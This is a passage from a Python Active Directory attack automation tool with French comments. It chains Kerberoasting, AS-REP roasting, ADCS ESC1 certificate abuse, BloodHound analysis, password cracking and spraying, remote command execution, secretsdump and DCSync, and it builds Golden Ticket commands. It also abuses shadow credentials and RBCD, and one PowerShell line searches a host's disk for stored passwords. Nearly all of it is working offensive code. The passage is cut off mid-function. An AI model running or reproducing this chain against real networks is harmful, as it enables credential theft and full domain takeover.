                try:
                    intel = ldap_dump(conn, base, state, args)
                    state["ldap_intel"] = intel
                    log(f"    {C.CY}{intel['users']} users ({intel['disabled']} disabled), "
                        f"{len(intel['computers'])} computers{C.X}")
                    if intel["kerberoastable"]:
                        add_finding(state, "HIGH",
                                    f"Kerberoastable : {len(intel['kerberoastable'])} compte(s) SPN",
                                    ", ".join(intel["kerberoastable"][:10]), dc)
                    if intel["asreproastable"]:
                        add_finding(state, "HIGH",
                                    f"AS-REP roastable : {len(intel['asreproastable'])} compte(s)",
                                    ", ".join(intel["asreproastable"][:10]), dc)
                    if intel["desc_secrets"]:
                        add_finding(state, "MED", "Mot de passe possible dans une description",
                                    " | ".join(intel["desc_secrets"][:5]), dc)
                    if intel["pwd_notreqd"]:
                        add_finding(state, "MED", f"PASSWD_NOTREQD : {len(intel['pwd_notreqd'])} compte(s)",
                                    ", ".join(intel["pwd_notreqd"][:10]), dc)
                    if intel["unconstrained"]:
                        add_finding(state, "CRIT", "Delegation NON CONTRAINTE detectee",
                                    ", ".join(intel["unconstrained"][:10]), dc)
                    for c in intel["computers"]:
                        if c["deleg"]:
                            add_finding(state, "HIGH", f"Delegation sur {c['name']} : {'+'.join(c['deleg'])}",
                                        "abus RBCD/unconstrained", dc)
                    # mini-BloodHound : ACL/DACL + LAPS + trusts (une seule fois par domaine)
                    if _once(state, f"acl:{base}"):
                        ldap_acl_scan(conn, base, state)
                        read_laps(conn, base, state)
                        enum_trusts(conn, base, state)
                        enum_dmsa_badsuccessor(conn, base, state, args, dc)
                except Exception as e:
                    log(f"{C.GR}    (dump LDAP partiel : {e}){C.X}")
            conn.unbind()
    else:
        log(f"{C.Y}[i] ldap3 absent -> dump LDAP saute (pip install ldap3).{C.X}")

    # Shares : enum authentifie + spider (creds en clair dans configs/scripts)
    enum_shares(args, state, hosts)
    # MSSQL (xp_cmdshell/links) + gMSA (msDS-ManagedPassword -> hash NT)
    enum_mssql(args, state, hosts)
    read_gmsa(args, state, first_dc(hosts))
    # GPP cpassword dechiffre + LAPS via impacket (creds en clair -> boucle)
    enum_gpp_impacket(args, state, first_dc(hosts))
    enum_laps_impacket(args, state, first_dc(hosts))

    tgt, extra = impacket_creds(args)

    # Kerberoasting
    if have("GetUserSPNs.py") and args.domain:
        log(f"{C.GR}[i] Kerberoasting (GetUserSPNs)...{C.X}")
        outfile = os.path.join(args.loot, "kerberoast.hashes")
        rc, out, _ = run_cmd(["GetUserSPNs.py", tgt, "-dc-ip", dc, "-request",
                              "-outputfile", outfile] + extra, 300)
        if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
            n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
            add_finding(state, "HIGH", f"Kerberoasting : {n} ticket(s) service extraits",
                        f"hashcat -m 13100 {outfile} rockyou.txt", dc)
            register_hashfile(state, "kerberoast", outfile)

    # AS-REP (vue authentifiee, si users.txt existe)
    phase_asrep(dc, args, state, label="auth")

    # GPP cpassword
    if nxc:
        log(f"{C.GR}[i] {nxc} : GPP cpassword (SYSVOL)...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args) +
                             (["-d", args.domain] if args.domain else []) + ["-M", "gpp_password"], 180)
        if re.search(r"password|cpassword|Found", out, re.I) and "usernames" in out.lower():
            add_finding(state, "HIGH", "GPP cpassword trouve dans SYSVOL",
                        "mot de passe dechiffrable (gpp-decrypt)", dc)

    # ADCS (certipy) - parsing JSON (fiable peu importe la version)
    if have("certipy") and args.domain:
        log(f"{C.GR}[i] certipy : ADCS templates vulnerables (json)...{C.X}")
        prefix = os.path.join(args.loot, "certipy")
        cmd = ["certipy", "find", "-vulnerable", "-json", "-output", prefix,
               "-dc-ip", dc, "-u", f"{args.user}@{args.domain}"]
        cmd += ["-hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
        rc, out, _ = run_cmd(cmd, 300)
        import glob as _glob
        jf = next((c for c in _glob.glob(prefix + "*.json") + _glob.glob(
                   os.path.join(args.loot, "*Certipy*.json")) if os.path.isfile(c)), None)
        if jf:
            try:
                data = json.load(open(jf, encoding="utf-8"))
                # CA (pour certipy req)
                cas = data.get("Certificate Authorities") or {}
                for _, ca in (cas.items() if isinstance(cas, dict) else []):
                    cn = ca.get("CA Name") or ca.get("Name") if isinstance(ca, dict) else None
                    if cn:
                        state.setdefault("adcs", {})["ca"] = cn
                        break
                tmpls = data.get("Certificate Templates") or {}
                for name, tpl in (tmpls.items() if isinstance(tmpls, dict) else []):
                    tname = tpl.get("Template Name", name) if isinstance(tpl, dict) else name
                    vulns = (tpl.get("[!] Vulnerabilities") or tpl.get("Vulnerabilities")
                             or {}) if isinstance(tpl, dict) else {}
                    for esc, desc in (vulns.items() if isinstance(vulns, dict) else []):
                        add_finding(state, "CRIT", f"ADCS {esc} sur template {tname}",
                                    str(desc)[:130], dc)
                        state.setdefault("adcs", {}).setdefault("templates", []).append((tname, esc))
            except Exception as e:
                log(f"{C.GR}    (parse certipy json : {e}){C.X}")
        else:   # repli regex si pas de json
            for esc in sorted(set(re.findall(r"ESC\d+", out))):
                add_finding(state, "CRIT", f"ADCS vulnerable : {esc}",
                            "certipy req ... (escalade via certificat)", dc)

    # Delegations (impacket)
    if have("findDelegation.py") and args.domain:
        rc, out, _ = run_cmd(["findDelegation.py", tgt, "-dc-ip", dc] + extra, 180)
        if re.search(r"Unconstrained|Constrained|Resource-Based", out):
            add_finding(state, "HIGH", "Delegation(s) exploitables (findDelegation)",
                        out[:200], dc)

    # BloodHound collection (une seule fois par domaine, meme en boucle)
    if have("bloodhound-python") and args.domain and _once(state, f"bh:{args.domain}"):
        log(f"{C.GR}[i] bloodhound-python : collecte (chemins vers DA)...{C.X}")
        cmd = ["bloodhound-python", "-d", args.domain, "-u", args.user, "-dc", dc,
               "-c", "All", "--zip", "-op", os.path.join(args.loot, "bh")]
        cmd += ["--hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
        rc, out, _ = run_cmd(cmd, 600)
        if "Done" in out or rc == 0:
            add_finding(state, "INFO", "BloodHound collecte (analyse les chemins vers Domain Admin)",
                        f"zip dans {args.loot}/", dc)

    # analyse BloodHound (DCSync/deleg/high-value) + crack (reinjecte les creds)
    bloodhound_analyze(args, state)
    crack_hashes(args, state)
    # reutilisation de mot de passe : spray les mdp craques sur tous les users
    spray_reuse(args, state, dc)

# ======================================================================
# PHASE 4 : ESCALADE & LATERAL
# ======================================================================
def phase4_escalation(hosts, args, state):
    stage("PHASE 4 - ESCALADE & LATERAL")
    dc = first_dc(state["hosts"])

    # 1) exploitation active des ACL abusables (shadow creds / RBCD / targeted roast)
    abuse_acl_paths(args, state, dc)
    # crack immediat des hashes obtenus (ex: targeted kerberoast) -> nouveau cred
    crack_hashes(args, state)
    # chasse de creds planquees SUR LE DISQUE via WinRM (scripts/configs) -> nouvel acces
    hunt_disk_creds(args, state, dc)

    # 2) cartographie des creds -> hotes (admin local ?) + RCE + secretsdump
    nxc = nxc_bin()
    if nxc:
        ips = list(hosts.keys())
        tf = save_loot(args, "hosts.txt", "\n".join(ips) + "\n")
        log(f"{C.GR}[i] {nxc} : ou ouvrent les creds (SMB/WinRM) sur {len(ips)} hote(s)...{C.X}")
        pwned = []
        for proto in ("smb", "winrm"):
            rc, out, _ = run_cmd([nxc, proto, tf] + nxc_auth(args) +
                                 (["-d", args.domain] if args.domain else []), 300)
            for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+).*\(Pwn3d!\)", out):
                host = m.group(1)
                add_finding(state, "CRIT", f"Admin local via {proto.upper()} sur {host}",
                            "acces administrateur -> shell/secretsdump", host)
                pwned.append((proto, host))
        for proto, host in pwned:
            win_exec(args, state, host, proto)          # RCE + commande shell
            if _gate(args) and have("secretsdump.py"):
                tgt, extra = impacket_creds(args)
                log(f"{C.GR}[i] secretsdump sur {host}...{C.X}")
                run_cmd(["secretsdump.py", f"{tgt}@{host}",
                         "-outputfile", os.path.join(args.loot, f"secrets_{host}")] + extra, 300)
    else:
        log(f"{C.Y}[i] nxc absent -> cartographie/RCE sautee (ACL/DCSync/ADCS restent OK).{C.X}")

    # 3) endgame : DCSync + coercion/relais + ADCS ESC -> PKINIT (gated --yes)
    dcsync_dump(args, state, dc)
    if args.relay:
        coerce_relay(args, state, dc)
    adcs_request(args, state, dc)

# ======================================================================
# CRACKING (hashcat/john) -> reinjecte les creds (la boucle CTF)
# ======================================================================
WORDLISTS = ["/usr/share/wordlists/rockyou.txt", "/usr/share/seclists/Passwords/rockyou.txt",
             "rockyou.txt", os.path.expanduser("~/rockyou.txt")]

def find_wordlist(args):
    if getattr(args, "wordlist", None) and os.path.isfile(args.wordlist):
        return args.wordlist
    for w in WORDLISTS:
        if os.path.isfile(w):
            return w
    return None

def _extract_cracked_user(hashline):
    """Recupere le username depuis une ligne de hash krb5 crackee."""
    m = re.search(r"\$krb5asrep\$\d+\$([^@:]+)@", hashline)
    if m: return m.group(1)
    m = re.search(r"\$krb5tgs\$\d+\$\*([^$*]+)\$", hashline)
    if m: return m.group(1)
    m = re.search(r"\$krb5tgs\$\d+\$([^$*:]+)", hashline)
    if m: return m.group(1)
    return None

def _hashfile_users(path):
    """Usernames presents dans un fichier de hashes AS-REP/Kerberoast."""
    users = set()
    try:
        for line in open(path, encoding="utf-8", errors="ignore"):
            u = _extract_cracked_user(line)
            if u:
                users.add(u)
    except Exception:
        pass
    return users

def register_hashfile(state, htype, path):
    """Enregistre un fichier de hashes ET alimente le tableau de bord (par user)."""
    state.setdefault("hashes", {})[htype] = path
    label = {"asrep": "AS-REP (18200)", "kerberoast": "Kerberoast (13100)",
             "ntds": "NTDS (NTLM)"}.get(htype, htype)
    for u in sorted(_hashfile_users(path)):
        board_hash(state, u, label)

def _pot_paths():
    """Emplacements possibles du john.pot (existants uniquement)."""
    cands = [os.path.expanduser("~/.john/john.pot"), "john.pot",
             os.path.expanduser("~/.local/share/john/john.pot"),
             "/root/.john/john.pot"]
    return [p for p in cands if os.path.isfile(p)]

def _john_pot_lines(valid_users):
    """Lit john.pot (hash_complet:password) et garde les lignes de NOS users.
    Comparaison INSENSIBLE A LA CASSE (le pot peut avoir 'jdoe' et les users
    'JDOE' selon l'outil qui a genere le hash -> sinon on rate le cred)."""
    out = []
    valid_lower = {v.lower() for v in valid_users} if valid_users else None
    for pot in _pot_paths():
        try:
            for pl in open(pot, encoding="utf-8", errors="ignore"):
                u = _extract_cracked_user(pl)
                if u and (valid_lower is None or u.lower() in valid_lower):
                    out.append(pl.strip())
        except Exception:
            pass
    return out

def _john_show_pairs(fmt, path, valid_users):
    """john --show -> (user, pw). Gere le '?:pw' des hashes krb en pairant avec
    l'unique user du fichier (cas frequent : 1 hash kerberoast = 1 user)."""
    if not have("john"):
        return []
    rc, out, _ = run_cmd(["john", "--show", "--format=" + fmt, path], 120)
    users = sorted(valid_users)
    pairs = []
    for l in out.splitlines():
        l = l.strip()
        if ":" not in l or re.search(r"password hash|Loaded|No password|Use the", l, re.I):
            continue
        head, pw = l.split(":", 1)[0].strip(), l.rsplit(":", 1)[-1].strip()
        if not pw:
            continue
        if head and head != "?" and re.match(r"^[\w.$-]+$", head):
            pairs.append((head.rstrip("$"), pw))
        elif len(users) == 1:                 # ?:pw + 1 seul user -> paire
            pairs.append((users[0], pw))
    return pairs

def crack_hashes(args, state):
    """Crack AS-REP (18200) et Kerberoast (13100), reinjecte les creds trouvees."""
    hashes = state.get("hashes", {})
    if not hashes:
        return 0
    if not have("hashcat") and not have("john"):
        log(f"{C.Y}[i] hashcat/john absents -> crack manuel (voir report.md).{C.X}")
        return 0
    wl = find_wordlist(args)
    if not wl:
        log(f"{C.Y}[i] Wordlist introuvable (--wordlist /chemin/rockyou.txt) -> crack saute.{C.X}")
        return 0
    new = 0
    modes = {"asrep": "18200", "kerberoast": "13100"}
    domain_users = set(state.get("users") or [])
    for kind, path in hashes.items():
        if not os.path.isfile(path):
            continue
        mode = modes.get(kind, None)
        fmt = "krb5asrep" if kind == "asrep" else "krb5tgs"
        creds = {}                      # user -> pw (dedupe naturel)

        # (a) hashcat sur le fichier BRUT (cas GPU) -> --show : lignes '$krb5...:pw'
        if have("hashcat") and mode:
            log(f"{C.GR}[i] Crack {kind} (hashcat -m {mode}) avec {os.path.basename(wl)}...{C.X}")
            run_cmd(["hashcat", "-m", mode, path, wl, "--quiet", "--force"], args.crack_timeout)
            rc, out, _ = run_cmd(["hashcat", "-m", mode, path, "--show", "--force"], 120)
            for l in out.splitlines():
                if "$krb5" in l and ":" in l:
                    u, pw = _extract_cracked_user(l), l.rsplit(":", 1)[-1].strip()
                    if u and pw:
                        creds[u] = pw

        # (b) JOHN : on prefixe chaque hash par 'user:' -> John connait le login
        #     -> 'john --show' renvoie 'user:password' (fini le '?:pw' non attribuable)
        if have("john"):
            jf = path + ".john"
            try:
                with open(path, encoding="utf-8", errors="ignore") as s, \
                     open(jf, "w", encoding="utf-8") as d:
                    for line in s:
                        line = line.strip()
                        if line and "$krb5" in line:
                            d.write(f"{_extract_cracked_user(line) or 'usr'}:{line}\n")
                if not creds:
                    log(f"{C.GR}[i] Crack {kind} via John (CPU)...{C.X}")
                    run_cmd(["john", f"--format={fmt}", f"--wordlist={wl}", jf], args.crack_timeout)
                rc, out, _ = run_cmd(["john", "--show", f"--format={fmt}", jf], 120)
                for l in out.splitlines():
                    l = l.strip()
                    if ":" not in l or re.search(r"password hash|cracked|Loaded|No password", l, re.I):
                        continue
                    rest = l.split(":")
                    u = rest[0].strip()
                    # john --show = 'user:password[:uid:gid:...]' (ou hash intercale)
                    # -> le mdp = 1er champ non vide et non-hash apres le user
                    cand = [f.strip() for f in rest[1:] if f.strip() and not f.strip().startswith("$")]
                    pw = cand[0] if cand else ""
                    if u and not u.startswith("$") and pw and "$krb5" not in pw:
                        creds[u] = pw
            except Exception:
                pass

        # (c) filet de securite : john.pot (users du domaine) -> hash complet -> user fiable
        for l in _john_pot_lines(domain_users):
            u, pw = _extract_cracked_user(l), l.rsplit(":", 1)[-1].strip()
            if u and pw:
                creds.setdefault(u, pw)

        pots = _pot_paths()
        log(f"{C.GR}    (crack {kind}: {len(creds)} cred(s) | pot: "
            f"{pots[0] if pots else 'INTROUVABLE'}){C.X}")
        for user, pw in creds.items():
            if 0 < len(pw) < 60 and "$krb5" not in pw and user != "usr":
                if not any(c.get("user") == user and c.get("password") == pw
                           for c in state.get("creds", [])):
                    record_cred(state, user, password=pw, src=f"{kind}-crack")
                    add_finding(state, "HIGH", f"Cred CRACKEE ({kind}) : {user}:{pw}",
                                "reutilisable -> re-enum (boucle)")
                    new += 1
    if new:
        save_loot(args, "cracked.txt",
                  "\n".join(f"{c['user']}:{c['password']}" for c in state["creds"]
                            if c.get("password")) + "\n")
    return new

# ======================================================================
# ANALYSE BLOODHOUND (parse le zip : DCSync, deleg, high-value)
# ======================================================================
def bloodhound_analyze(args, state):
    import glob, zipfile
    zips = sorted(glob.glob(os.path.join(args.loot, "**", "*.zip"), recursive=True),
                  key=os.path.getmtime, reverse=True)
    jsons = {}
    if zips:
        try:
            with zipfile.ZipFile(zips[0]) as z:
                for n in z.namelist():
                    if n.endswith(".json"):
                        jsons[n] = z.read(n).decode("utf-8", "ignore")
        except Exception:
            pass
    for f in glob.glob(os.path.join(args.loot, "**", "*.json"), recursive=True):
        low = os.path.basename(f).lower()
        if any(k in low for k in ("users", "computers", "domains", "groups")):
            try:
                jsons[low] = open(f, encoding="utf-8", errors="ignore").read()
            except Exception:
                pass
    if not jsons:
        log(f"{C.GR}[i] Pas de data BloodHound a analyser (collecte d'abord).{C.X}")
        return
    log(f"{C.GR}[i] Analyse BloodHound ({len(jsons)} fichier(s))...{C.X}")
    dcsync, unconstrained, hv = set(), set(), set()
    for name, txt in jsons.items():
        try:
            data = json.loads(txt)
        except Exception:
            continue
        for obj in data.get("data", []) if isinstance(data, dict) else []:
            props = obj.get("Properties", {}) or {}
            name_ = (props.get("name") or props.get("distinguishedname") or "").upper()
            if props.get("unconstraineddelegation"):
                unconstrained.add(name_)
            if props.get("highvalue"):
                hv.add(name_)
            for ace in obj.get("Aces", []) or []:
                right = str(ace.get("RightName", "")).lower()
                if right in ("getchanges", "getchangesall", "dcsync", "all"):
                    pr = str(ace.get("PrincipalSID", ace.get("PrincipalName", ""))).upper()
                    dcsync.add(pr or name_)
    if dcsync:
        add_finding(state, "CRIT", f"Droits DCSync detectes ({len(dcsync)} principal)",
                    "secretsdump.py -just-dc  (dump du domaine)")
        state.setdefault("bloodhound", {})["dcsync"] = sorted(dcsync)[:20]
    if unconstrained:
        add_finding(state, "CRIT", f"Delegation non contrainte ({len(unconstrained)})",
                    ", ".join(sorted(unconstrained)[:8]))
    if hv:
        state.setdefault("bloodhound", {})["highvalue"] = sorted(hv)[:30]
    log(f"{C.GR}    -> ouvre le zip dans BloodHound GUI pour les chemins complets vers DA.{C.X}")

# ======================================================================
# GOLDEN TICKET : extrait le hash krbtgt du dump NTDS -> ferme la boucle
# ======================================================================
def extract_krbtgt(ntds_file, state):
    if not os.path.isfile(ntds_file):
        return None
    try:
        for line in open(ntds_file, encoding="utf-8", errors="ignore"):
            if "krbtgt:" in line.lower() and ":::" in line:
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    nt_hash = parts[3]
                    dsid = state.get("domain_sid", "<DOMAIN_SID>")
                    dom = state.get("domain", "<domain>")
                    add_finding(state, "CRIT", "Golden Ticket possible (hash krbtgt extrait)",
                                f"ticketer.py -nthash {nt_hash} -domain-sid {dsid} "
                                f"-domain {dom} Administrator")
                    state.setdefault("secrets", {})["krbtgt_nt"] = nt_hash
                    return nt_hash
    except Exception:
        pass
    return None

# ======================================================================
# DCSYNC (secretsdump -just-dc) : l'endgame
# ======================================================================
def dcsync_dump(args, state, dc):
    if state.get("hashes", {}).get("ntds"):
        return   # deja dumpe (evite de refaire en boucle)
    if args.safe or not args.yes:
        if state.get("bloodhound", {}).get("dcsync"):
            log(f"{C.Y}[i] Droits DCSync dispo -> lance avec --yes (pas --safe) pour dumper le domaine.{C.X}")
        return
    if not have("secretsdump.py"):
        log(f"{C.Y}[i] secretsdump.py absent -> DCSync manuel.{C.X}")
        return
    tgt, extra = impacket_creds(args)
    outb = os.path.join(args.loot, "domain_ntds")
    ntds = outb + ".ntds"
    try:                       # retire un eventuel dump precedent -> le check reflete CE run
        os.remove(ntds)
    except OSError:
        pass
    log(f"{C.R}{C.BD}[i] DCSync : dump complet du domaine (secretsdump -just-dc)...{C.X}")
    rc, out, _ = run_cmd(["secretsdump.py", f"{tgt}@{dc}", "-just-dc", "-outputfile", outb] + extra, 600)
    if (os.path.isfile(ntds) and os.path.getsize(ntds) > 0) or "krbtgt:" in out.lower():
        add_finding(state, "CRIT", "DCSync reussi : hashes NTDS du domaine dumpes",
                    f"{ntds} (krbtgt -> Golden Ticket possible)", dc)
        state.setdefault("hashes", {})["ntds"] = ntds
        extract_krbtgt(ntds, state)   # ferme la boucle : krbtgt -> commande Golden Ticket
    else:
        log(f"{C.GR}    -> DCSync refuse avec {args.user} (droits insuffisants).{C.X}")

# ======================================================================
# COERCION + NTLM RELAY (PetitPotam / Coercer -> ntlmrelayx)
# ======================================================================
def coerce_relay(args, state, dc):
    relayable = [ip for ip, r in state["hosts"].items() if r.get("smb_signing_required") is False]
    if not relayable:
        log(f"{C.GR}[i] Aucun hote sans signing -> relais NTLM sans objet.{C.X}")
        return
    if args.safe or not args.yes:
        log(f"{C.Y}[i] Surface de relais sur {len(relayable)} hote(s). "
            f"Lance avec --relay --yes --lhost <toi> pour l'exploiter (actif).{C.X}")
        return
    if not (have("ntlmrelayx.py") and (have("PetitPotam.py") or have("coercer") or have("Coercer.py"))):
        log(f"{C.Y}[i] ntlmrelayx + PetitPotam/Coercer requis (impacket + coercer).{C.X}")
        return
    log(f"{C.R}{C.BD}[i] Relais NTLM : lance ntlmrelayx puis coerce {dc}...{C.X}")
    add_finding(state, "HIGH", "Coercion+relais lances (verifie la sortie ntlmrelayx)",
                f"cibles: {', '.join(relayable[:5])}", dc)
    log(f"{C.GR}    ntlmrelayx.py -tf hosts.txt -smb2support  (+ PetitPotam {args.lhost} {dc}){C.X}")
    log(f"{C.GR}    [manuel recommande : le relais est interactif]{C.X}")

# ======================================================================
# ADCS ESC1 : demande de certificat au nom d'un admin (gated)
# ======================================================================
def adcs_request(args, state, dc):
    adcs = state.get("adcs", {})
    templates = adcs.get("templates", [])
    ca = adcs.get("ca")
    if not templates:
        return
    if not _gate(args):
        for tname, esc in templates[:3]:
            add_finding(state, "INFO", f"ADCS {esc} template {tname} : req manuel",
                        f"certipy req -u {args.user}@{args.domain} -ca {ca} -template {tname} "
                        f"-upn administrator@{args.domain}", dc)
        return
    if not have("certipy"):
        return
    # ESC1 : demande un cert au nom de administrator, puis PKINIT -> hash
    esc1 = next(((t, e) for (t, e) in templates if "ESC1" in e.upper()), templates[0])
    tname = esc1[0]
    log(f"{C.R}{C.BD}[i] ADCS {esc1[1]} : certipy req template {tname} (upn administrator)...{C.X}")
    outp = os.path.join(args.loot, "administrator")
    cmd = ["certipy", "req", "-u", f"{args.user}@{args.domain}", "-ca", ca or "",
           "-template", tname, "-upn", f"administrator@{args.domain}", "-dc-ip", dc, "-out", outp]
    cmd += ["-hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
    run_cmd(cmd, 240)
    pfx = outp + ".pfx"
    if os.path.isfile(pfx):
        add_finding(state, "CRIT", f"ADCS ESC1 : certificat 'administrator' obtenu ({tname})",
                    "PKINIT -> hash NT", dc)
        pkinit_from_pfx(args, state, dc, pfx)

# ======================================================================
# EXPLOITATION ACTIVE Tier 1 (gated --yes / pas --safe) :
# shadow credentials, RBCD, PKINIT, execution de commandes
# ======================================================================
def _gate(args):
    return (not args.safe) and args.yes

def add_cred_hash(state, user, nthash, src):
    nt = nthash.split(":")[-1] if nthash else None
    if not (user and nt):
        return
    if not any(c.get("user") == user and c.get("hash") == nt for c in state.get("creds", [])):
        record_cred(state, user, nthash=nt, src=src)
        add_finding(state, "CRIT", f"Hash NT obtenu : {user} ({src})",
                    "reutilisable -> re-enum / pass-the-hash (boucle)")

def win_exec(args, state, host, proto="smb", cmd="whoami"):
    """Prouve le RCE (commande unique) + genere la commande shell interactive."""
    nxc = nxc_bin()
    if nxc and _gate(args):
        rc, out, _ = run_cmd([nxc, proto, host] + nxc_auth(args) +
                             (["-d", args.domain] if args.domain else []) + ["-x", cmd], 120)
        if out and re.search(r"[\w.-]+\\[\w$.-]+|nt authority", out, re.I):
            add_finding(state, "CRIT", f"RCE confirme sur {host} ({proto} -x {cmd})", "shell dispo", host)
    idflag = f"-H {args.nthash}" if args.nthash else f"-p '{args.password}'"
    if proto == "winrm":
        add_finding(state, "INFO", f"Shell : evil-winrm -i {host} -u {args.user} {idflag}", host=host)
    else:
        add_finding(state, "INFO", f"Shell : wmiexec.py {args.domain}/{args.user}@{host} {idflag}", host=host)

# PowerShell : dump le contenu des fichiers texte qui contiennent un motif de creds
_DISK_PS = ("Get-ChildItem C:\\ -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs,*.config,*.xml,*.ini,*.txt,*.psd1 "
            "-ErrorAction SilentlyContinue | Select-String -List -Pattern 'password|passwd|pwd|secret|cred' "
            "-ErrorAction SilentlyContinue | ForEach-Object { \"=== \" + $_.Path + \" ===\"; "
            "Get-Content $_.Path -ErrorAction SilentlyContinue }")

def hunt_disk_creds(args, state, dc):
    """Cherche des creds SUR LE DISQUE via WinRM (-x) : scripts/configs qui planquent
    un mot de passe en dur (compte de service, tache planifiee, sync...). Ce qu'un
    scanner classique ne fait pas : il faut executer du code sur l'hote pour lire C:\\."""
    nxc = nxc_bin()
    if not (nxc and _gate(args)):
        return
    tried = state.setdefault("_diskhunt", set())
    for c in list(state.get("creds", [])):
        u = (c.get("user") or "")
        if not u or u.lower() in tried:
            continue
        tried.add(u.lower())
        idflag = ["-H", nt_full(c["hash"])] if c.get("hash") else ["-p", c.get("password") or ""]
        rc, out, _ = run_cmd([nxc, "winrm", dc, "-u", u] + idflag +
                             (["-d", args.domain] if args.domain else []) + ["-x", _DISK_PS], 240)
        if "Pwn3d" not in out and "===" not in out:
            continue   # pas d'acces WinRM ou rien
        log(f"{C.GR}[i] Disk hunt via WinRM ({u}) -> analyse des fichiers...{C.X}")
        for user, pw in _parse_creds_from_bytes(out.encode("utf-8", "ignore")):
            if user.lower() in ("username", "user", "") or not pw:
                continue
            if not any(x.get("user", "").lower() == user.lower() and x.get("password") == pw
                       for x in state.get("creds", [])):
                record_cred(state, user, password=pw, src="disk")
                add_finding(state, "CRIT", f"Cred sur le disque (via {u}) : {user}:{pw}",
                            "trouve dans un fichier/script sur C:\\ -> nouvel acces", dc)

def abuse_shadow_credentials(args, state, dc, target):
    """GenericWrite/GenericAll sur un compte -> KeyCredentialLink -> PKINIT -> hash NT."""
    base_cmd = f"certipy shadow auto -u {args.user}@{args.domain} -account {target}"
    if not (args.domain and _gate(args)) or not have("certipy"):
        add_finding(state, "HIGH", f"Shadow Credentials possible sur {target}", base_cmd)
        return
    log(f"{C.R}{C.BD}[i] Shadow Credentials -> {target} (certipy shadow auto)...{C.X}")
    cmd = ["certipy", "shadow", "auto", "-u", f"{args.user}@{args.domain}",
           "-account", target, "-dc-ip", dc]
    cmd += ["-hashes", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
    rc, out, _ = run_cmd(cmd, 300)
    m = (re.search(r"Got hash for '[^']+':\s*([0-9a-fA-F]{32}:[0-9a-fA-F]{32})", out)
         or re.search(r"NT hash[^0-9a-f]*([0-9a-f]{32})", out, re.I))
    if m:
        add_cred_hash(state, target, m.group(1), "shadow-credentials")

def abuse_rbcd(args, state, dc, target_computer):
    """GenericWrite sur une machine -> RBCD -> ticket admin (S4U2self/proxy)."""
    tname = target_computer.rstrip("$")
    if not (args.domain and _gate(args)) or not (have("rbcd.py") and have("getST.py")):
        add_finding(state, "HIGH", f"RBCD possible sur {target_computer}",
                    f"addcomputer.py + rbcd.py -delegate-to {tname}$ -action write + "
                    f"getST.py -spn cifs/{tname} -impersonate Administrator")
        return
    import secrets, string
    fake = "wks-" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(6)) + "$"
    fpass = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16)) + "aA1!"
    tgt, extra = impacket_creds(args)
    log(f"{C.R}{C.BD}[i] RBCD -> {target_computer} (addcomputer + rbcd + S4U)...{C.X}")
    if have("addcomputer.py"):
        run_cmd(["addcomputer.py", tgt, "-computer-name", fake, "-computer-pass", fpass,
                 "-dc-ip", dc] + extra, 180)
    run_cmd(["rbcd.py", tgt, "-delegate-to", target_computer, "-delegate-from", fake,
             "-action", "write", "-dc-ip", dc] + extra, 180)
    ccache = os.path.join(args.loot, f"rbcd_{tname}.ccache")
    run_cmd(["getST.py", "-spn", f"cifs/{tname}", "-impersonate", "Administrator",
             f"{args.domain}/{fake}:{fpass}", "-dc-ip", dc], 180)
    add_finding(state, "CRIT", f"RBCD execute sur {target_computer} -> ticket Administrator",
                f"KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass {tname}", target_computer)

def pkinit_from_pfx(args, state, dc, pfx):
    """certipy auth -pfx -> UnPAC-the-hash -> hash NT (ferme la chaine ADCS)."""
    if not (have("certipy") and _gate(args) and os.path.isfile(pfx)):
        return
    log(f"{C.R}{C.BD}[i] PKINIT : certipy auth -pfx {os.path.basename(pfx)}...{C.X}")
    rc, out, _ = run_cmd(["certipy", "auth", "-pfx", pfx, "-dc-ip", dc], 180)
    m = re.search(r"Got hash for '([^']+)':\s*([0-9a-fA-F]{32}:[0-9a-fA-F]{32})", out)
    if m:
        add_cred_hash(state, m.group(1).split("@")[0].split("\\")[-1], m.group(2), "PKINIT/ADCS")

def targeted_kerberoast(args, state, dc, target):
    """GenericWrite sur un user (sans ADCS) : set fake SPN -> roast -> crack -> unset."""
    base_cmd = (f"targetedKerberoast.py -d {args.domain} -u {args.user} "
                f"--request-user {target} --dc-ip {dc}")
    if not (args.domain and _gate(args)) or not have("targetedKerberoast.py"):
        add_finding(state, "HIGH", f"Targeted Kerberoast possible sur {target}", base_cmd)
        return
    outfile = os.path.join(args.loot, f"targetroast_{target}.hashes")
    cmd = ["targetedKerberoast.py", "-d", args.domain, "-u", args.user,
           "--request-user", target, "--dc-ip", dc, "-o", outfile]
    cmd += ["-H", nt_full(args.nthash)] if args.nthash else ["-p", args.password or ""]
    log(f"{C.R}{C.BD}[i] Targeted Kerberoast -> {target}...{C.X}")
    run_cmd(cmd, 180)
    if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
        state.setdefault("hashes", {})["kerberoast"] = outfile   # cracke par crack_hashes / --loop
        add_finding(state, "HIGH", f"Targeted Kerberoast : hash de {target} obtenu",
                    f"hashcat -m 13100 {outfile} (cracke auto en boucle)", dc)

def abuse_acl_paths(args, state, dc):
    """Weaponise les ACL abusables : on exploite un chemin des qu'on POSSEDE le cred
    du principal 'from' (peu importe l'utilisateur courant), en s'authentifiant avec."""
    paths = state.get("acl_paths", [])
    if not paths:
        return
    # creds qu'on possede : user.lower() -> cred
    owned = {}
    for c in state.get("creds", []):
        if c.get("user"):
            owned.setdefault(c["user"].lower(), c)
    if args.user and args.user.lower() not in owned:
        owned[args.user.lower()] = {"user": args.user, "password": args.password, "hash": args.nthash}
    log(f"\n{C.GR}[i] Exploitation de {len(paths)} chemin(s) ACL "
        f"({len(owned)} principal(aux) controle(s))...{C.X}")
    done = set()
    for p in paths:
        frm, to, rights = p.get("from", ""), p.get("to", ""), p.get("rights", [])
        if (frm.lower(), to.lower()) in done:
            continue
